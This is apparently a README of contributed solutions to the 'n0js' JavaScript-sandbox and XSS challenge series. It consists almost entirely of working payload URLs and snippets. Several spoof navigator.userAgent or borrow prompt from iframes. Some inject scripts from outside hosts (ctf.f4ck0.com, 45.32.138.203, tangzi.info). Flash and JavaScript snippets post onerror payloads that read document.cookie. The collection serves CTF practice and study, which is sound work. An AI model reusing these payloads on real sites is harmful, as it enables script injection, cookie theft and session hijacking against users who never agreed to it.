# n0js Challenges

[http://server.n0tr00t.com/n0js/case1.html](http://server.n0tr00t.com/n0js/case1.html)

	#### @Nearg1e [yourneargo@gmail.com]
	- http://server.n0tr00t.com/n0js/case1_writeup.txt

[http://server.n0tr00t.com/n0js/case2.html](http://server.n0tr00t.com/n0js/case2.html)

	#### @fyth
    - case2.html?a=location.hash.substr(1)#setTimeout("hi.eval('prompt(location.href)')",500)
    - case2.html?a=location.hash.substr(1)#navigator.__defineGetter__('userAgent', function(){ return '<svg/onload=prompt(location.href)>'})

	#### @evi1m0

    - case2.html?a=location.hash.substr(1)#var frame = document.createElement('iframe');
      frame.style.display = 'none'; document.body.appendChild(frame);
      function navigator(){} window.navigator = new Proxy(window.frames[0].window.navigator,
      { get: function(n0t){return "<img src=@ onerror=alert(location.href)>";} })
      
	#### 1124696276

    - case2.html?a=location.hash.substr(1)#function createProperty(value){var _value=value;function _get(){return _value}function _set(v){_value=v}return{"get":_get,"set":_set}};
      function makePropertyWritable(objBase,objScopeName,propName,initValue){var newProp,initObj;if(objBase&&objScopeName in objBase&&propName in objBase[objScopeName])
      {if(typeof initValue==="undefined"){initValue=objBase[objScopeName][propName]}
	  newProp=createProperty(initValue);try{Object.defineProperty(objBase[objScopeName],propName,newProp)}
      catch(e){initObj={};initObj[propName]=newProp;
      try{objBase[objScopeName]=Object.create(objBase[objScopeName],initObj)}catch(e){}}}};
      makePropertyWritable(window,"navigator","userAgent");
      window.navigator.userAgent="<script>prompt(location.href)</script>";
    
	#### @gaoheby
	- case2.html?a=window.location.hash.substring(1)#Object.defineProperty(navigator,'userAgent',
	  {get:function(){return '<script>prompt(location.href)</script>';}})
    
	#### Cnlouds
	- case2.html?test=location.hash.substr(1)#window.addEventListener('load', function(){window.hi.prompt(hi.location.href)});

	#### kaotudou [jianshu.com/p/eb22e86635e0]
	- case2.html?1=eval((window.location.search.substring(49)));
      =var/**/script=document.createElement`script`;script.src=`https://
      ctf.f4ck0.com/1.js`;document.body.appendChild(script);

[http://server.n0tr00t.com/n0js/case3.php](http://server.n0tr00t.com/n0js/case3.php)

	#### @Nearg1e [yourneargo@gmail.com]
	- case3.php?2017=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=http://tangzi.info:43992/payload/n0js_case3.swf%3E
	- AS3 Script:
	    package {
	        import flash.*;
	        import flash.net.*;
	
	        public class XSS {
	
	            public function XSS():void{
	            }
	            public static function main():void{
	                Lib.getURL(new URLRequest("javascript:a=document.createElement('iframe');a.src='https://www.n0tr00t.com/static/test/helloevent.html';document.body.appendChild(a);setTimeout(function(){window.frames[0].postMessage('<img src=1 onerror=prompt(document.cookie)>','*')},3000);"), "_top");
	            }
	
	        }
	    }
	    
	#### daocaoren [jkme.github.io/n0js-case3.html]
	- case3.php?2017=%3Csvg%3E%3Cset+href%3d%23script+attributeName%3dhref+to%3ddata%3a%2cs%3ddocument.createElement(%22script%22)
	  %3bs.src%3d%22http%3a%2f%2f45.32.138.203%2f2.js%22%3bdocument.body.appendChild(s)%3b+%2f%3E%3Cscript+id%3dscript+src%3dfoo%3E%3C%2fscript%3E+
	- jssource:
	    var t = document.createElement("iframe");
	    t.setAttribute("src","https://www.n0tr00t.com/static/test/helloevent.html");
	    document.body.appendChild(t);
	
	    function a(){
	        var b = document.createElement("button");
	        b.setAttribute("onclick","frames[0].postMessage('<img src=x onerror=alert(document.cookie)>','*')");
	        b.click();
	    }
	    //setTimeout("a()",3000);
	    window.onload = a();
	    
[http://server.n0tr00t.com/n0js/case4.php](http://server.n0tr00t.com/n0js/case4.php)
	
	#### @woto [woto3679@gmail.com]
	- case4.php?x=d=document;D=Document.prototype;D.appendChild.call(d.body,(D.createElement.call(d,%22iframe%22))).contentWindow.prompt.call(window,location);
	
	#### @evi1m0 [evi1m0.bat@gmail.com]
	- case4.php?x=document.writeln(%27%3Ciframe%3E%27);frames[0].prompt(location)

	#### @Nearg1e [yourneargo@gmail.com]
	- case4.php?x=document.writeln(%22%3Ciframe%3E%3C/iframe%3E%22);let%20f=document.querySelector(%27iframe%27);f.contentWindow.prompt(location);
	
	#### @math1as [ma7h1as.l@gmail.com]
	- case4.php?x=document.body.innerHTML=%27%3Ciframe%20id=%22a%22%20/%3E%27;a.contentWindow.prompt(location)

[http://server.n0tr00t.com/n0js/case5.php](http://server.n0tr00t.com/n0js/case5.php)
